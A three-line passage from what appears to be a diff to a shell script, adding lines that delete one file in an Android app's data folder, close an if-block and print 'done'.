+rm /storage/emulated/0/Android/data/officeg/2g
+fi
+echo "done"
